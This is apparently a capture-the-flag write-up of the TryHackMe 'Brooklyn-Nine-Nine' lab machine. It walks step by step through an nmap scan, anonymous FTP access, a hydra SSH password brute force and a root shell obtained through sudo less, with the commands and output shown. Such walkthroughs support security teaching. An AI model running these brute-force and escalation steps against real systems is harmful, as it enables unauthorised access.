# Brooklyn-Nine-Nine

**IP:** 10.10.75.244  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 07/06/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.75.244 -oA nmap/Brooklyn-Nine-Nine
```

| Port | Service | Version |
|------|---------|---------|
| 21 | ftp | vsftpd 3.0.3 |
| 22 | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80 | http | Apache httpd 2.4.29 |

## Enumeration

Anonymous login was enabled on the FTP server
```bash
ftp 10.10.75.244 21 -i

Connected to 10.10.75.244.
220 (vsFTPd 3.0.3)
Name (10.10.75.244:wither): anonymous
331 Please specify the password.
Password: 
230 Login successful.
```

## Exploitation

There was a text file in the FTP server containing a note to `jake`. The note suggested that `jake`'s password may be weak.
```bash
dir

...
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
...
mget *
...
226 Transfer complete.
...

exit
221 Goodbye.
                                                                                                       
cat note_to_jake.txt 

From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine          
```

So I bruteforced `jake`'s password with `hydra` to reveal his credentials `jake:987654321`.
```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.75.244 -t 10 -vI

...
[22][ssh] host: 10.10.75.244   login: jake   password: 987654321
...
```

## Privilege Escalation

I used his password to SSH into the machine, and found that he could run `/usr/bin/less` with NOPASSWD sudo permissions.
```bash
ssh jake@10.10.75.244

sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ sudo less /etc/profile
```

I used this to spawn a privileged shell by running `less` on a file as `root`, then executing `/bin/sh`.
```bash
sudo less /etc/profile
!/bin/sh

id
uid=0(root) gid=0(root) groups=0(root)
```

User flag was in `/home/holt/user.txt`.
```bash
find / -iname "user.txt" 2>/dev/null
/home/holt/user.txt

cat /home/holt/user.txt
```

`root` flag was in `/root/root.txt`.
```bash
cat /root/root.txt
```

---
#nmap #hydra #ftp-anon #ssh-bruteforce #sudo-less #gtfobins #weak-password #linux-privesc #thm